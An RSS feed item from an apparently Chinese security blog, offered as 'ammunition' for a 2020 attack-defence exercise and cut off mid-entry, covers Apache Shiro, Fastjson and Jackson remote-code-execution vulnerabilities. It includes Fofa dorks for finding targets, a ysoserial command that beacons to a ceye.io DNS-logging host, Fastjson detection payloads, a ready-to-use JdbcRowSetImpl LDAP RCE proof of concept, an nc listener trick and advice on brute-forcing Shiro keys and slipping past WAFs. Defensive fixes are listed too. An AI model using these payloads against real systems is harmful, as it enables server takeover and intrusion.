<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>2020攻防演练 on iceH&#39;s Blog</title>
        <link>https://360rce.github.io/tags/2020%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/</link>
        <description>Recent content in 2020攻防演练 on iceH&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
        <lastBuildDate>Fri, 24 Apr 2020 16:28:37 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/2020%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>2020攻防演练弹药库-您有主机上线请注意</title>
        <link>https://360rce.github.io/p/bw9pj09k/</link>
        <pubDate>Fri, 24 Apr 2020 16:28:37 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/bw9pj09k/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/7p/wallhaven-7ploe9.png" alt="Featured image of post 2020攻防演练弹药库-您有主机上线请注意" /&gt;&lt;h2 id=&#34;第一节&#34;&gt;第一节&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏.
基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言.
另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通.
由于本文长度接近四万字, 所以采取分篇连载.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;apache-shiro-rememberme-反序列化导致的命令执行漏洞-shiro-550-cve-2016-4437&#34;&gt;Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set-Cookie: rememberMe=deleteMe&lt;/code&gt;
或者URL中有shiro字样
有一些时候服务器不会主动返回 &lt;code&gt;rememberMe=deleteMe&lt;/code&gt;, 直接发包即可&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Apache-Shiro&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/shiro-rememberme-1-2-4/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/shiro-rememberme-1-2-4/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具
&lt;a class=&#34;link&#34; href=&#34;https://github.com/wyzxxz/shiro_rce&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/wyzxxz/shiro_rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro回显poc改造计划
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.使用多个泄露的key进行遍历, 这个在实战中确实有效&lt;/p&gt;
&lt;p&gt;关于Shiro反序列化漏洞的延伸—升级shiro也能被shell
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Shiro 100 Key
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.使用 &lt;code&gt;URLDNS&lt;/code&gt; 进行检测提速&lt;/p&gt;
&lt;p&gt;使用适应性最强的&lt;code&gt;URLDNS&lt;/code&gt;(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测&lt;/p&gt;
&lt;p&gt;且可以使用&lt;code&gt;ysoserial&lt;/code&gt;提前生成序列化内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS &amp;quot;http://1234567890.test.ceye.io&amp;quot; &amp;gt; urldns.ser&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后使用&lt;code&gt;占位符+目标url hash&lt;/code&gt;的方法修改序列化内容中的&lt;code&gt;urldns&lt;/code&gt;地址&lt;/p&gt;
&lt;p&gt;提高检测速度以及后续检测无需使用&lt;code&gt;ysoserial&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例如 &lt;code&gt;1234567890.test.ceye.io&lt;/code&gt; 可以换成 &lt;code&gt;md5(&#39;www.qq.com&#39;).hexdigest() [:10].test.ceye.io&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;也就是 &lt;code&gt;9d2c68d82d.test.ceye.io&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以预先记录 hash&lt;/p&gt;
&lt;p&gt;&lt;code&gt;9d2c68d82d www.qq.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后进行hash查表就可以知道是&lt;code&gt;DNSLOG&lt;/code&gt;来自哪个目标, 性能会提高不少&lt;/p&gt;
&lt;p&gt;3.已知目标使用了&lt;code&gt;Shiro&lt;/code&gt;, 可以采取&lt;code&gt;Shiro-721&lt;/code&gt;的报错逻辑来进行遍历&lt;code&gt;key&lt;/code&gt; — 星光哥&lt;/p&gt;
&lt;p&gt;这样即使DNS不能出网, 也可以通过是否返回 &lt;code&gt;rememberMe=deleteMe&lt;/code&gt; 来断定 &lt;code&gt;shiro&lt;/code&gt; &lt;code&gt;key&lt;/code&gt; 的正确性, 前提是服务器有&lt;code&gt;rememberMe=deleteMe&lt;/code&gt;相关回显&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级Shiro到最新版&lt;/p&gt;
&lt;p&gt;2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上&lt;/p&gt;
&lt;p&gt;3.WAF拦截Cookie中长度过大的rememberMe值&lt;/p&gt;
&lt;h2 id=&#34;apache-shiro-padding-oracle-attack-shiro-721&#34;&gt;Apache Shiro Padding Oracle Attack (Shiro-721)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro 是企业常见的 Java安全框架, 由于&lt;code&gt;Shiro&lt;/code&gt;使用&lt;code&gt;AES-CBC&lt;/code&gt;模式进行加解密处理, 所以存在&lt;code&gt;Padding Oracle Attack&lt;/code&gt;漏洞, 已经登录的攻击者同样可以进行反序列化操作&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro &amp;lt; 1.4.2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set-Cookie: rememberMe=deleteMe&lt;/code&gt;
URL中有shiro字样
有一些时候服务器不会主动返回 &lt;code&gt;rememberMe=deleteMe&lt;/code&gt;, 直接发包即可&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Apache-Shiro&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/193165&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/193165&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog
&lt;a class=&#34;link&#34; href=&#34;http://www.oniont.cn/index.php/archives/298.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.oniont.cn/index.php/archives/298.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)
&lt;a class=&#34;link&#34; href=&#34;https://github.com/wuppp/shiro_rce_exp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/wuppp/shiro_rce_exp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.该漏洞需要登录后获取到合法的&lt;code&gt;Cookie: rememberMe=XXX&lt;/code&gt;后才可以进行利用, 看起来不是很好利用&lt;/p&gt;
&lt;p&gt;但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥&lt;/p&gt;
&lt;p&gt;所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性&lt;/p&gt;
&lt;p&gt;2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 &lt;code&gt;rememberMe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级Shiro到最新版&lt;/p&gt;
&lt;p&gt;2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上&lt;/p&gt;
&lt;p&gt;3.WAF拦截Cookie中长度过大的rememberMe值&lt;/p&gt;
&lt;p&gt;4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie&lt;/p&gt;
&lt;h2 id=&#34;apache-shiro-权限绕过漏洞-shiro-682&#34;&gt;Apache Shiro 权限绕过漏洞 (Shiro-682)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro &amp;lt; 1.5.2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set-Cookie: rememberMe=deleteMe&lt;/code&gt;
或者URL中有shiro字样
有一些时候服务器不会主动返回 &lt;code&gt;rememberMe=deleteMe&lt;/code&gt;, 直接发包即可&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Apache-Shiro&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.url中间可以尝试添加 &lt;code&gt;../&lt;/code&gt; , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞&lt;/p&gt;
&lt;p&gt;关于url解析的问题可以参考以下链接&lt;/p&gt;
&lt;p&gt;A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!
&lt;a class=&#34;link&#34; href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Tomcat URL解析差异性导致的安全问题 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7544&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7544&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级1.5.2版本及以上&lt;/p&gt;
&lt;p&gt;2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.&lt;/p&gt;
&lt;h2 id=&#34;fastjson-反序列化远程代码执行漏洞&#34;&gt;Fastjson 反序列化远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响&lt;/p&gt;
&lt;p&gt;(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Fastjson &amp;lt; 1.2.48 (&amp;lt;1.2.68?)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以通过DNS回显的方式检测后端是否使用Fastjson&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;java.net.Inet4Address&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;java.net.Inet6Address&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;java.net.InetSocketAddress&amp;#34;{&amp;#34;address&amp;#34;:, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.alibaba.fastjson.JSONObject&amp;#34;, {&amp;#34;@type&amp;#34;: &amp;#34;java.net.URL&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}}&amp;#34;&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{&amp;#34;@type&amp;#34;:&amp;#34;java.net.URL&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}:&amp;#34;aaa&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set[{&amp;#34;@type&amp;#34;:&amp;#34;java.net.URL&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set[{&amp;#34;@type&amp;#34;:&amp;#34;java.net.URL&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{&amp;#34;@type&amp;#34;:&amp;#34;java.net.URL&amp;#34;, &amp;#34;val&amp;#34;:&amp;#34;dnslog&amp;#34;}:0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可以通过DOS时间延迟或者报错回显的方式检测&lt;/p&gt;
&lt;p&gt;无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&amp;lt;1.2.60)
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;fastjson &amp;lt; 1.2.66 版本最新漏洞分析
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Fastjson &amp;lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/181874&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/181874&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.JDK降级编译&lt;/p&gt;
&lt;p&gt;CaijiOrz/fastjson-1.2.47-RCE: Fastjson &amp;lt;= 1.2.47 远程命令执行漏洞利用工具及方法
&lt;a class=&#34;link&#34; href=&#34;https://github.com/CaijiOrz/fastjson-1.2.47-RCE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/CaijiOrz/fastjson-1.2.47-RCE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;源项目中最后一句&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的&lt;code&gt;.class&lt;/code&gt; , 相信可以解决很多小伙伴的问题&lt;/p&gt;
&lt;p&gt;&lt;code&gt;javac -source 1.7 -target 1.7 Exploit.java&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.2.47版本以下通杀Poc:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{&amp;quot;name&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;, &amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;}, &amp;quot;f&amp;quot;:{&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;, &amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://asdfasfd/&amp;quot;, &amp;quot;autoCommit&amp;quot;:true}}, age:11}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;{&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;, &amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://asdfasfd/&amp;quot;, &amp;quot;autoCommit&amp;quot;:true}&lt;/code&gt;也可以替换成其他利用链&lt;/p&gt;
&lt;p&gt;2.优先使用LDAP协议&lt;/p&gt;
&lt;p&gt;根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMI协议的利用方式 在&lt;code&gt;JDK 6u132/7u122/8u113&lt;/code&gt; 及以上版本中修复了
LDAP协议的利用方式 在&lt;code&gt;JDK 6u211/7u201/8u191&lt;/code&gt; 及以上版本中修复了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制&lt;/p&gt;
&lt;p&gt;如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/column/207439.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/column/207439.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.如何查看服务器的jdk版本呢, 这里也有个小技巧&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvvp 80#[marshalsec中指定的HTTP端口]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当服务器连接过来时, &lt;code&gt;User-Agent&lt;/code&gt;中会标明当前服务器的JDK版本&lt;/p&gt;
&lt;p&gt;2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]&lt;/p&gt;
&lt;p&gt;fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson
&lt;a class=&#34;link&#34; href=&#34;https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class GenericFastJsonRedisSerializer implements RedisSerializer&amp;lt;Object&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;private final static ParserConfig defaultRedisConfig = new ParserConfig();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;static { defaultRedisConfig.setAutoTypeSupport(true);}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其他消息队列之类的都是同理&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级Fastjson到最新版(&amp;gt;=1.2.68 新增了safemode, 彻底关闭autotype)
2.WAF拦截过滤请求包中的 &lt;code&gt;@type&lt;/code&gt;, &lt;code&gt;%u0040%u0074%u0079%u0070%u0065&lt;/code&gt;, &lt;code&gt;\u0040type&lt;/code&gt;, &lt;code&gt;\x04type&lt;/code&gt; 等多种编码的autotype变形&lt;/p&gt;
&lt;p&gt;3.最少升级到1.2.48以上版本且关闭autotype选项&lt;/p&gt;
&lt;p&gt;4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上&lt;/p&gt;
&lt;h2 id=&#34;jackson-反序列化远程代码执行漏洞&#34;&gt;Jackson 反序列化远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Jackson&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&amp;lt;1.2.60)
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
